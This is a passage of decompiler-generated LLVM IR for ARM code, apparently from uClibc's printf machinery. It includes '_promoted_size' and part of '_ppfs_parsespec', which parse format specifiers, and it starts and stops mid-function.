  %v0_11a24 = load i32, i32* %ip.global-to-local, align 4
  %v1_11a24 = add i32 %v0_11a24, 8
  store i32 %v1_11a24, i32* %ip.global-to-local, align 4
  %v0_11a28.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_11a2c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_11a28

dec_label_pc_11a28:                               ; preds = %dec_label_pc_11964, %dec_label_pc_11a24
  %v0_11a2c = phi i32 [ %v0_11a2c25, %dec_label_pc_11964 ], [ %v0_11a2c.pre, %dec_label_pc_11a24 ]
  %v0_11a28 = phi i32 [ %v1_1196424, %dec_label_pc_11964 ], [ %v0_11a28.pre, %dec_label_pc_11a24 ]
  %v1_11a28 = add i32 %v0_11a28, 1
  store i32 %v1_11a28, i32* %lr.global-to-local, align 4
  %v1_11a2c = add i32 %v0_11a2c, 28
  %v2_11a2c = inttoptr i32 %v1_11a2c to i32*
  %v3_11a2c = load i32, i32* %v2_11a2c, align 4
  store i32 %v3_11a2c, i32* %r3.global-to-local, align 4
  %v5_11a34 = icmp slt i32 %v1_11a28, %v3_11a2c
  br i1 %v5_11a34, label %dec_label_pc_11964, label %dec_label_pc_11a2c.dec_label_pc_11a38.loopexit_crit_edge

dec_label_pc_11a3c:                               ; preds = %entry
  br i1 %v6_11918, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_11a3c
  %v2_11a40 = add i32 %v0_11900, 36
  %v3_11a40 = inttoptr i32 %v2_11a40 to i8*
  %v4_11a40 = load i8, i8* %v3_11a40, align 1
  %v5_11a40 = zext i8 %v4_11a40 to i32
  %v5_11a44 = mul nuw nsw i32 %v5_11a40, 8
  %v6_11a44 = add i32 %v5_11a44, %v1_1190c
  store i32 %v6_11a44, i32* %r3.global-to-local, align 4
  %v2_11a48 = add i32 %v6_11a44, -8
  %v3_11a48 = inttoptr i32 %v2_11a48 to i32*
  %v4_11a48 = load i32, i32* %v3_11a48, align 4
  store i32 %v4_11a48, i32* %r3.global-to-local, align 4
  store i32 %v4_11a48, i32* %v2_11910, align 4
  %v0_11a50.pre = load i32, i32* @r0, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_11a3c, %bb
  %v2_11a64 = phi i32 [ %v0_11a50.pre, %bb ], [ %v0_11900, %dec_label_pc_11a3c ]
  %v1_11a50 = add i32 %v2_11a64, 4
  %v2_11a50 = inttoptr i32 %v1_11a50 to i32*
  %v3_11a50 = load i32, i32* %v2_11a50, align 4
  store i32 %v3_11a50, i32* %r3.global-to-local, align 4
  %v6_11a54 = icmp eq i32 %v3_11a50, -2147483648
  br i1 %v6_11a54, label %bb15, label %dec_label_pc_11a38

bb15:                                             ; preds = %.thread2
  %v2_11a58 = add i32 %v2_11a64, 37
  %v3_11a58 = inttoptr i32 %v2_11a58 to i8*
  %v4_11a58 = load i8, i8* %v3_11a58, align 1
  %v5_11a58 = zext i8 %v4_11a58 to i32
  %v1_11a5c = load i32, i32* %ip.global-to-local, align 4
  %v5_11a5c = mul nuw nsw i32 %v5_11a58, 8
  %v6_11a5c = add i32 %v5_11a5c, %v1_11a5c
  store i32 %v6_11a5c, i32* %r3.global-to-local, align 4
  %v2_11a60 = add i32 %v6_11a5c, -8
  %v3_11a60 = inttoptr i32 %v2_11a60 to i32*
  %v4_11a60 = load i32, i32* %v3_11a60, align 4
  store i32 %v4_11a60, i32* %r3.global-to-local, align 4
  store i32 %v4_11a60, i32* %v2_11a50, align 4
  %v0_11a68.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_11a38

dec_label_pc_11a2c.dec_label_pc_11a38.loopexit_crit_edge: ; preds = %dec_label_pc_11a28
  br label %dec_label_pc_11a38.loopexit

dec_label_pc_11a38.loopexit:                      ; preds = %dec_label_pc_11a2c.dec_label_pc_11a38.loopexit_crit_edge, %dec_label_pc_1195c
  %v0_11a2c.lcssa = phi i32 [ %v0_11a2c, %dec_label_pc_11a2c.dec_label_pc_11a38.loopexit_crit_edge ], [ %v0_11a2c18, %dec_label_pc_1195c ]
  br label %dec_label_pc_11a38

dec_label_pc_11a38:                               ; preds = %dec_label_pc_11a38.loopexit, %.thread2, %bb15
  %v1_11a88 = phi i32 [ %v0_11a2c.lcssa, %dec_label_pc_11a38.loopexit ], [ %v2_11a64, %.thread2 ], [ %v0_11a68.pre, %bb15 ]
  %v1_11a68 = add i32 %v1_11a88, 8
  %v2_11a68 = inttoptr i32 %v1_11a68 to i32*
  %v3_11a68 = load i32, i32* %v2_11a68, align 4
  store i32 %v3_11a68, i32* %r1.global-to-local, align 4
  %v1_11a6c = icmp slt i32 %v3_11a68, 0
  br i1 %v1_11a6c, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_11a38
  %v5_11a70 = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_11a70, i32* @r4, align 4
  ret i32 %v1_11a88

bb17:                                             ; preds = %dec_label_pc_11a38
  %v1_11a74 = add i32 %v1_11a88, 16
  %v2_11a74 = inttoptr i32 %v1_11a74 to i32*
  %v3_11a74 = load i32, i32* %v2_11a74, align 4
  %v1_11a7c = sub i32 0, %v3_11a68
  store i32 %v1_11a7c, i32* %r1.global-to-local, align 4
  %v1_11a78 = and i32 %v3_11a74, -10
  %v1_11a80 = or i32 %v1_11a78, 8
  store i32 %v1_11a80, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_11a88 = add i32 %v1_11a88, 20
  %v3_11a88 = inttoptr i32 %v2_11a88 to i32*
  store i32 32, i32* %v3_11a88, align 4
  %v0_11a8c = load i32, i32* %r1.global-to-local, align 4
  %v1_11a8c = load i32, i32* @r0, align 4
  %v2_11a8c = add i32 %v1_11a8c, 8
  %v3_11a8c = inttoptr i32 %v2_11a8c to i32*
  store i32 %v0_11a8c, i32* %v3_11a8c, align 4
  %v0_11a90 = load i32, i32* %r3.global-to-local, align 4
  %v1_11a90 = load i32, i32* @r0, align 4
  %v2_11a90 = add i32 %v1_11a90, 16
  %v3_11a90 = inttoptr i32 %v2_11a90 to i32*
  store i32 %v0_11a90, i32* %v3_11a90, align 4
  %v2_11a94 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11a94, i32* @r4, align 4
  %v8_11a94 = load i32, i32* @r0, align 4
  ret i32 %v8_11a94

; uselistorder directives
  uselistorder i32 %v1_11a28, { 2, 1, 0 }
  uselistorder i32 %v0_11a2c, { 1, 2, 0 }
  uselistorder i32 %v3_119fc, { 0, 2, 1, 3 }
  uselistorder i32 %v3_11974, { 3, 1, 0, 2, 4 }
  uselistorder i32* %v2_11974, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v3_11968, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v1_1196424, { 1, 0 }
  uselistorder i32 %v0_11a2c18, { 2, 0, 1 }
  uselistorder i32 %v0_11900, { 0, 3, 1, 2, 5, 4, 6 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 17, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9 }
  uselistorder i32* %lr.global-to-local, { 2, 1, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 76, { 3, 4, 5, 6, 2, 0, 1 }
  uselistorder label %dec_label_pc_11a38, { 0, 2, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_11a28, { 1, 0 }
  uselistorder label %dec_label_pc_11a24, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_11a14, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_119fc, { 1, 0 }
  uselistorder label %dec_label_pc_119e8, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_11964, { 1, 0 }
  uselistorder label %dec_label_pc_1195c, { 1, 0 }
  uselistorder label %dec_label_pc_11938, { 1, 0 }
}

define i32 @_promoted_size() local_unnamed_addr {
entry:
  %v1_11ab4.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_11aa0

dec_label_pc_11aa0:                               ; preds = %dec_label_pc_11abc, %entry
  %v0_11aa0 = phi i32 [ %v1_11aa0, %dec_label_pc_11abc ], [ ptrtoint (i32* @global_var_1cab4.603 to i32), %entry ]
  %v1_11aa0 = add i32 %v0_11aa0, -2
  %v1_11aa4 = add i32 %v0_11aa0, -1
  %v2_11aa4 = inttoptr i32 %v1_11aa4 to i8*
  %v3_11aa4 = load i8, i8* %v2_11aa4, align 1
  %v4_11aa4 = zext i8 %v3_11aa4 to i32
  %v1_11aa8 = inttoptr i32 %v1_11aa0 to i8*
  %v2_11aa8 = load i8, i8* %v1_11aa8, align 2
  %v3_11aa8 = zext i8 %v2_11aa8 to i32
  %v3_11aac = mul nuw i32 %v4_11aa4, 16777216
  %v4_11ab0 = sdiv i32 %v3_11aac, 65536
  %v5_11ab0 = or i32 %v4_11ab0, %v3_11aa8
  %v9_11ab4 = icmp eq i32 %v5_11ab0, %v1_11ab4.pre
  br i1 %v9_11ab4, label %dec_label_pc_11aa0.dec_label_pc_11ac8_crit_edge, label %dec_label_pc_11abc

dec_label_pc_11aa0.dec_label_pc_11ac8_crit_edge:  ; preds = %dec_label_pc_11aa0
  br label %dec_label_pc_11ac8

dec_label_pc_11abc:                               ; preds = %dec_label_pc_11aa0
  %tmp = icmp ugt i32 %v1_11aa0, ptrtoint (i32* @global_var_1ca9c.605 to i32)
  br i1 %tmp, label %dec_label_pc_11aa0, label %dec_label_pc_11ac8

dec_label_pc_11ac8:                               ; preds = %dec_label_pc_11abc, %dec_label_pc_11aa0.dec_label_pc_11ac8_crit_edge
  %v2_11ad0.pre-phi = sub i32 %v1_11aa0, ptrtoint (i32* @global_var_1ca9c.605 to i32)
  store i32 ptrtoint (i32* @global_var_1cab4.603 to i32), i32* @r2, align 4
  %v4_11ad4 = sdiv i32 %v2_11ad0.pre-phi, 2
  %v5_11ad4 = add i32 %v4_11ad4, ptrtoint (i32* @global_var_1cab4.603 to i32)
  %v6_11ad4 = inttoptr i32 %v5_11ad4 to i8*
  %v7_11ad4 = load i8, i8* %v6_11ad4, align 1
  %v9_11ad4 = zext i8 %v7_11ad4 to i32
  ret i32 %v9_11ad4

; uselistorder directives
  uselistorder i32 %v1_11aa0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_11aa0, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1cab4.603 to i32), { 1, 2, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp106 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-87 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_11ae8 = load i32, i32* @r4, align 4
  store i32 %v3_11ae8, i32* %stack_var_-32, align 4
  %v6_11ae8 = load i32, i32* @r5, align 4
  %v25_11ae8 = ptrtoint i32* %stack_var_-32 to i32
  %v1_11aec = add i32 %tmp, 16
  %v2_11aec = inttoptr i32 %v1_11aec to i32*
  %v3_11aec = load i32, i32* %v2_11aec, align 4
  %v2_11af0 = ptrtoint i32* %stack_var_-88 to i32
  %v1_11af4 = and i32 %v3_11aec, 128
  store i32 %v1_11af4, i32* @r4, align 4
  %v2_11af4 = icmp eq i32 %v1_11af4, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r7.global-to-local, align 4
  %v1_11b14 = add i32 %tmp, 24
  %v2_11b14 = inttoptr i32 %v1_11b14 to i32*
  %v3_11b14 = load i32, i32* %v2_11b14, align 4
  store i32 %v3_11b14, i32* %sb.global-to-local, align 4
  br i1 %v2_11af4, label %bb, label %dec_label_pc_11b34

bb:                                               ; preds = %entry
  %v3_11b18 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_11b80

dec_label_pc_11b24:                               ; preds = %dec_label_pc_11d04
  %v0_11b24 = load i32, i32* %r0.global-to-local, align 4
  %v0_11d34.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11d2c

dec_label_pc_11b2c:                               ; preds = %dec_label_pc_11d30
  %v1_11b2c = add i32 %v0_11d34.pre, 1
  store i32 %v1_11b2c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11d4c

dec_label_pc_11b34:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11b38

dec_label_pc_11b38:                               ; preds = %dec_label_pc_11b6c.dec_label_pc_11b38_crit_edge, %dec_label_pc_11b34
  %v1_11b48 = phi i32 [ %v1_11b5c, %dec_label_pc_11b6c.dec_label_pc_11b38_crit_edge ], [ 0, %dec_label_pc_11b34 ]
  %v0_11b38 = phi i32 [ %v0_11b38.pre, %dec_label_pc_11b6c.dec_label_pc_11b38_crit_edge ], [ %tmp, %dec_label_pc_11b34 ]
  %v1_11b38 = inttoptr i32 %v0_11b38 to i32*
  %v2_11b38 = load i32, i32* %v1_11b38, align 4
  %v4_11b3c = mul i32 %v1_11b48, 4
  %v5_11b3c = add i32 %v2_11b38, %v4_11b3c
  store i32 %v5_11b3c, i32* %r3.global-to-local, align 4
  %v1_11b40 = add i32 %v5_11b3c, -4
  %v2_11b40 = inttoptr i32 %v1_11b40 to i32*
  %v3_11b40 = load i32, i32* %v2_11b40, align 4
  store i32 %v3_11b40, i32* %r1.global-to-local, align 4
  store i32 %v25_11ae8, i32* %ip.global-to-local, align 4
  %v2_11b48 = add i32 %v1_11b48, %v25_11ae8
  store i32 %v2_11b48, i32* %r2.global-to-local, align 4
  %v1_11b4c = trunc i32 %v3_11b40 to i8
  %v3_11b4c = add i32 %v2_11b48, -56
  %v4_11b4c = inttoptr i32 %v3_11b4c to i8*
  store i8 %v1_11b4c, i8* %v4_11b4c, align 1
  %v0_11b50 = load i32, i32* %r2.global-to-local, align 4
  %v1_11b50 = add i32 %v0_11b50, -56
  %v2_11b50 = inttoptr i32 %v1_11b50 to i8*
  %v3_11b50 = load i8, i8* %v2_11b50, align 1
  %v4_11b50 = zext i8 %v3_11b50 to i32
  store i32 %v4_11b50, i32* %r2.global-to-local, align 4
  %v0_11b54 = load i32, i32* %r3.global-to-local, align 4
  %v1_11b54 = add i32 %v0_11b54, -4
  %v2_11b54 = inttoptr i32 %v1_11b54 to i32*
  %v3_11b54 = load i32, i32* %v2_11b54, align 4
  store i32 %v3_11b54, i32* %r3.global-to-local, align 4
  %v9_11b58 = icmp eq i32 %v4_11b50, %v3_11b54
  %v0_11b5c = load i32, i32* %r0.global-to-local, align 4
  %v1_11b5c = add i32 %v0_11b5c, 1
  store i32 %v1_11b5c, i32* %r0.global-to-local, align 4
  br i1 %v9_11b58, label %dec_label_pc_11b64, label %dec_label_pc_11f7c

dec_label_pc_11b64:                               ; preds = %dec_label_pc_11b38
  %v2_11b64 = icmp eq i8 %v3_11b50, 0
  br i1 %v2_11b64, label %dec_label_pc_11b74, label %dec_label_pc_11b6c

dec_label_pc_11b6c:                               ; preds = %dec_label_pc_11b64
  %tmp166 = icmp ult i32 %v1_11b5c, 32
  br i1 %tmp166, label %dec_label_pc_11b6c.dec_label_pc_11b38_crit_edge, label %dec_label_pc_11b74

dec_label_pc_11b6c.dec_label_pc_11b38_crit_edge:  ; preds = %dec_label_pc_11b6c
  %v0_11b38.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11b38

dec_label_pc_11b74:                               ; preds = %dec_label_pc_11b6c, %dec_label_pc_11b64
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_11b7c = ptrtoint i32* %stack_var_-87 to i32
  br label %dec_label_pc_11b80

dec_label_pc_11b80:                               ; preds = %bb, %dec_label_pc_11b74
  %storemerge102 = phi i32 [ %v2_11b7c, %dec_label_pc_11b74 ], [ %v3_11b18, %bb ]
  store i32 %storemerge102, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_11b90

dec_label_pc_11b8c:                               ; preds = %.thread22, %dec_label_pc_11c9c
  %v0_11b8c = phi i32 [ %v2_11d14, %.thread22 ], [ %storemerge105, %dec_label_pc_11c9c ]
  %stack_var_-48.0 = phi i32 [ %stack_var_-48.3, %.thread22 ], [ %stack_var_-48.2, %dec_label_pc_11c9c ]
  store i32 %v0_11b8c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11b90

dec_label_pc_11b90:                               ; preds = %dec_label_pc_11b80, %dec_label_pc_11b8c
  %v1_11bac = phi i32 [ %storemerge102, %dec_label_pc_11b80 ], [ %v0_11b8c, %dec_label_pc_11b8c ]
  %stack_var_-48.1 = phi i32 [ %tmp106, %dec_label_pc_11b80 ], [ %stack_var_-48.0, %dec_label_pc_11b8c ]
  %v1_11b90 = inttoptr i32 %v1_11bac to i8*
  %v2_11b90 = load i8, i8* %v1_11b90, align 1
  %v3_11b90 = zext i8 %v2_11b90 to i32
  store i32 %v3_11b90, i32* %r3.global-to-local, align 4
  %v7_11b94 = icmp eq i8 %v2_11b90, 42
  br i1 %v7_11b94, label %bb124, label %.thread9.thread

.thread9.thread:                                  ; preds = %dec_label_pc_11b90
  store i32 %v1_11bac, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

bb124:                                            ; preds = %dec_label_pc_11b90
  %v1_11ba0 = load i32, i32* @lr, align 4
  %v4_11ba0 = mul i32 %v1_11ba0, -4
  %v5_11ba0 = add i32 %v4_11ba0, %v25_11ae8
  store i32 %v5_11ba0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_11bac = add i32 %v1_11bac, 1
  store i32 %v2_11bac, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_11bb4 = add i32 %v5_11ba0, -12
  %v4_11bb4 = inttoptr i32 %v3_11bb4 to i32*
  store i32 0, i32* %v4_11bb4, align 4
  %v0_11bd8.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb124, %.thread9.thread
  %v0_11bd8.pre = phi i32 [ %v0_11bd8.pre.pre, %bb124 ], [ %v1_11bac, %.thread9.thread ]
  %v2_11bdc.pre = load i32, i32* @global_var_2abb8, align 4
  br label %.backedge

dec_label_pc_11bbc:                               ; preds = %.backedge
  store i32 4094, i32* %r3.global-to-local, align 4
  %v0_11bc0 = load i32, i32* %r0.global-to-local, align 4
  %v7_11bc4 = icmp sgt i32 %v0_11bc0, 4094
  br i1 %v7_11bc4, label %.thread12, label %bb126

.thread12:                                        ; preds = %dec_label_pc_11bbc
  %v1_11bcc14 = add i32 %v0_11c50, 1
  store i32 %v1_11bcc14, i32* %r6.global-to-local, align 4
  br label %.backedge

bb126:                                            ; preds = %dec_label_pc_11bbc
  %v11_11bc8 = mul i32 %v0_11bc0, 10
  %v12_11bc8 = add i32 %v11_11bc8, %v3_11bd8
  store i32 %v12_11bc8, i32* %r3.global-to-local, align 4
  %v1_11bcc = add i32 %v0_11c50, 1
  store i32 %v1_11bcc, i32* %r6.global-to-local, align 4
  %v9_11bd0 = add i32 %v12_11bc8, -48
  store i32 %v9_11bd0, i32* %r0.global-to-local, align 4
  br label %.backedge

.backedge:                                        ; preds = %.thread12, %bb126, %.preheader
  %v0_11c50 = phi i32 [ %v0_11bd8.pre, %.preheader ], [ %v1_11bcc, %bb126 ], [ %v1_11bcc14, %.thread12 ]
  store i32 175032, i32* %r3.global-to-local, align 4
  %v1_11bd8 = inttoptr i32 %v0_11c50 to i8*
  %v2_11bd8 = load i8, i8* %v1_11bd8, align 1
  %v3_11bd8 = zext i8 %v2_11bd8 to i32
  store i32 %v3_11bd8, i32* %r2.global-to-local, align 4
  store i32 %v2_11bdc.pre, i32* %r3.global-to-local, align 4
  %v3_11be0 = mul nuw nsw i32 %v3_11bd8, 2
  %v4_11be0 = add i32 %v3_11be0, %v2_11bdc.pre
  %v5_11be0 = inttoptr i32 %v4_11be0 to i8*
  %v6_11be0 = load i8, i8* %v5_11be0, align 1
  %v8_11be0 = zext i8 %v6_11be0 to i32
  store i32 %v8_11be0, i32* %r3.global-to-local, align 4
  %v1_11be4 = and i32 %v8_11be0, 8
  %v2_11be4 = icmp eq i32 %v1_11be4, 0
  br i1 %v2_11be4, label %dec_label_pc_11bec, label %dec_label_pc_11bbc

dec_label_pc_11bec:                               ; preds = %.backedge
  %v0_11bec = load i32, i32* %r1.global-to-local, align 4
  %v1_11bec = add i32 %v0_11bec, -1
  %v2_11bec = inttoptr i32 %v1_11bec to i8*
  %v3_11bec = load i8, i8* %v2_11bec, align 1
  %v4_11bec = zext i8 %v3_11bec to i32
  store i32 %v4_11bec, i32* %r3.global-to-local, align 4
  %v7_11bf0 = icmp eq i8 %v3_11bec, 37
  br i1 %v7_11bf0, label %dec_label_pc_11bf8, label %dec_label_pc_11cb4

dec_label_pc_11bf8:                               ; preds = %dec_label_pc_11bec
  %v7_11bf8 = icmp eq i8 %v2_11bd8, 36
  %. = zext i1 %v7_11bf8 to i32
  store i32 %., i32* %ip.global-to-local, align 4
  %v0_11c04 = load i32, i32* %r0.global-to-local, align 4
  %tmp129 = icmp slt i32 %v0_11c04, 1
  br i1 %tmp129, label %bb130, label %thread-pre-split

bb130:                                            ; preds = %dec_label_pc_11bf8
  store i32 0, i32* %ip.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_11bf8, %bb130
  %v1_11c60 = phi i32 [ 0, %bb130 ], [ %., %dec_label_pc_11bf8 ]
  %v2_11c0c = icmp eq i32 %v1_11c60, 0
  %v0_11c3c = load i32, i32* %sb.global-to-local, align 4
  br i1 %v2_11c0c, label %dec_label_pc_11c3c, label %dec_label_pc_11c14

dec_label_pc_11c14:                               ; preds = %thread-pre-split
  %v2_11c3c = icmp eq i32 %v0_11c3c, 0
  %v1_11c18 = add i32 %v0_11c50, 1
  store i32 %v1_11c18, i32* %r1.global-to-local, align 4
  br i1 %v2_11c3c, label %dec_label_pc_11f7c, label %dec_label_pc_11c20

dec_label_pc_11c20:                               ; preds = %dec_label_pc_11c14
  %v2_11c20 = sub i32 %v0_11c04, %v0_11c3c
  %v4_11c20 = xor i32 %v0_11c3c, %v0_11c04
  %v5_11c20 = xor i32 %v2_11c20, %v0_11c04
  %v6_11c20 = and i32 %v5_11c20, %v4_11c20
  %v7_11c20 = icmp slt i32 %v6_11c20, 0
  %v8_11c20 = icmp slt i32 %v2_11c20, 0
  %v9_11c20 = icmp eq i32 %v0_11c04, %v0_11c3c
  %v3_11c24 = xor i1 %v8_11c20, %v7_11c20
  %v4_11c24 = or i1 %v9_11c20, %v3_11c24
  br i1 %v4_11c24, label %dec_label_pc_11c34, label %bb131

bb131:                                            ; preds = %dec_label_pc_11c20
  store i32 %v0_11c04, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_11c34

dec_label_pc_11c30:                               ; preds = %dec_label_pc_11c50, %dec_label_pc_11c58
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_11c34

dec_label_pc_11c34:                               ; preds = %bb131, %dec_label_pc_11c20, %dec_label_pc_11c30
  %v0_11c34 = phi i32 [ %v0_11bec, %dec_label_pc_11c30 ], [ %v1_11c18, %dec_label_pc_11c20 ], [ %v1_11c18, %bb131 ]
  %stack_var_-48.2 = phi i32 [ %stack_var_-48.1, %dec_label_pc_11c30 ], [ %v0_11c04, %dec_label_pc_11c20 ], [ %v0_11c04, %bb131 ]
  br label %dec_label_pc_11c6c

dec_label_pc_11c3c:                               ; preds = %thread-pre-split
  %tmp132 = icmp slt i32 %v0_11c3c, 1
  br i1 %tmp132, label %dec_label_pc_11c50, label %dec_label_pc_11c44

dec_label_pc_11c44:                               ; preds = %dec_label_pc_11c3c
  %v7_11c44 = icmp eq i8 %v2_11bd8, 109
  br i1 %v7_11c44, label %dec_label_pc_11cb4, label %dec_label_pc_11f7c

dec_label_pc_11c50:                               ; preds = %dec_label_pc_11c3c
  %tmp167 = icmp ugt i32 %v0_11c50, %v0_11bec
  br i1 %tmp167, label %dec_label_pc_11c58, label %dec_label_pc_11c30

dec_label_pc_11c58:                               ; preds = %dec_label_pc_11c50
  %v1_11c58 = inttoptr i32 %v0_11bec to i8*
  %v2_11c58 = load i8, i8* %v1_11c58, align 1
  %v3_11c58 = zext i8 %v2_11c58 to i32
  store i32 %v3_11c58, i32* %r3.global-to-local, align 4
  %v7_11c5c = icmp eq i8 %v2_11c58, 48
  br i1 %v7_11c5c, label %dec_label_pc_11c30, label %bb133

bb133:                                            ; preds = %dec_label_pc_11c58
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_11cb4

dec_label_pc_11c6c.loopexit:                      ; preds = %dec_label_pc_11c74
  %v1_11c80 = load i32, i32* @r4, align 4
  %v3_11c80 = or i32 %v1_11c80, %v0_11c94
  store i32 %v3_11c80, i32* @r4, align 4
  %v2_11c84 = add i32 %storemerge105, 1
  br label %dec_label_pc_11c6c

dec_label_pc_11c6c:                               ; preds = %dec_label_pc_11c6c.loopexit, %dec_label_pc_11c34
  %storemerge105 = phi i32 [ %v0_11c34, %dec_label_pc_11c34 ], [ %v2_11c84, %dec_label_pc_11c6c.loopexit ]
  store i32 %storemerge105, i32* %r6.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1ca94.612 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_11c78 = inttoptr i32 %storemerge105 to i8*
  br label %dec_label_pc_11c74

dec_label_pc_11c74:                               ; preds = %dec_label_pc_11c8c, %dec_label_pc_11c6c
  %v0_11c94 = phi i32 [ %v2_11c94, %dec_label_pc_11c8c ], [ 1, %dec_label_pc_11c6c ]
  %v0_11c74 = phi i32 [ %v5_11c74, %dec_label_pc_11c8c ], [ ptrtoint ([8 x i8]* @global_var_1ca94.612 to i32), %dec_label_pc_11c6c ]
  %v1_11c74 = inttoptr i32 %v0_11c74 to i8*
  %v2_11c74 = load i8, i8* %v1_11c74, align 1
  %v3_11c74 = zext i8 %v2_11c74 to i32
  store i32 %v3_11c74, i32* %r2.global-to-local, align 4
  %v5_11c74 = add i32 %v0_11c74, 1
  store i32 %v5_11c74, i32* %r1.global-to-local, align 4
  %v2_11c78 = load i8, i8* %v1_11c78, align 1
  %v3_11c78 = zext i8 %v2_11c78 to i32
  store i32 %v3_11c78, i32* %r3.global-to-local, align 4
  %v9_11c7c = icmp eq i8 %v2_11c78, %v2_11c74
  br i1 %v9_11c7c, label %dec_label_pc_11c6c.loopexit, label %dec_label_pc_11c8c

dec_label_pc_11c8c:                               ; preds = %dec_label_pc_11c74
  %v1_11c8c = inttoptr i32 %v5_11c74 to i8*
  %v2_11c8c = load i8, i8* %v1_11c8c, align 1
  %v3_11c8c = zext i8 %v2_11c8c to i32
  store i32 %v3_11c8c, i32* %r3.global-to-local, align 4
  %v2_11c90 = icmp eq i8 %v2_11c8c, 0
  %v2_11c94 = mul i32 %v0_11c94, 2
  store i32 %v2_11c94, i32* %r0.global-to-local, align 4
  br i1 %v2_11c90, label %dec_label_pc_11c9c, label %dec_label_pc_11c74

dec_label_pc_11c9c:                               ; preds = %dec_label_pc_11c8c
  %v1_11c9c = add i32 %storemerge105, -1
  %v2_11c9c = inttoptr i32 %v1_11c9c to i8*
  %v3_11c9c = load i8, i8* %v2_11c9c, align 1
  %v7_11ca0 = icmp eq i8 %v3_11c9c, 37
  %v0_11ca4 = load i32, i32* @r4, align 4
  %v1_11ca4 = and i32 %v0_11ca4, 10
  store i32 %v1_11ca4, i32* %r3.global-to-local, align 4
  %v4_11ca8 = udiv i32 %v1_11ca4, 2
  %v5_11ca8 = sub nuw nsw i32 -1, %v4_11ca8
  %v6_11ca8 = and i32 %v0_11ca4, %v5_11ca8
  store i32 %v6_11ca8, i32* @r4, align 4
  br i1 %v7_11ca0, label %dec_label_pc_11cb0, label %dec_label_pc_11b8c

dec_label_pc_11cb0:                               ; preds = %dec_label_pc_11c9c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11cb4

dec_label_pc_11cb4:                               ; preds = %bb133, %dec_label_pc_11bec, %dec_label_pc_11c44, %dec_label_pc_11cb0
  %v1_11cf8 = phi i32 [ %storemerge105, %dec_label_pc_11cb0 ], [ %v0_11c50, %bb133 ], [ %v0_11c50, %dec_label_pc_11c44 ], [ %v0_11c50, %dec_label_pc_11bec ]
  %v0_11cf4 = phi i32 [ %v5_11c74, %dec_label_pc_11cb0 ], [ %v0_11bec, %bb133 ], [ %v0_11bec, %dec_label_pc_11c44 ], [ %v0_11bec, %dec_label_pc_11bec ]
  %stack_var_-48.3 = phi i32 [ %stack_var_-48.2, %dec_label_pc_11cb0 ], [ %stack_var_-48.1, %bb133 ], [ %stack_var_-48.1, %dec_label_pc_11c44 ], [ %stack_var_-48.1, %dec_label_pc_11bec ]
